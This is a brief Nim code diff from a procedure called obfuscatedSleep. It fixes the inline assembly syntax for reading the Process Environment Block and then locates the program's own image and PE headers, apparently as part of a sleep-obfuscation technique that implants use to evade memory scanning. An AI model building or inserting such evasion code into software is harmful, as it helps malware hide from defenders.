@@ -234,7 +234,7 @@ proc obfuscatedSleep*(ms: uint32, key: ptr array[16, byte]) =
 
   # Find own image base + size via PEB
   var peb: uint
-  {.emit: """__asm__ volatile ("mov %0, qword ptr gs:[0x60]" : "=r"(`peb`));""".}
+  {.emit: """__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(`peb`));""".}
   let imgBase = cast[ptr byte](cast[ptr uint](peb + 0x10)[])
   let dosHdr  = cast[ptr IMAGE_DOS_HEADER](imgBase)
   let ntHdr   = cast[ptr IMAGE_NT_HEADERS64](cast[uint](imgBase) + uint(dosHdr[].e_lfanew))
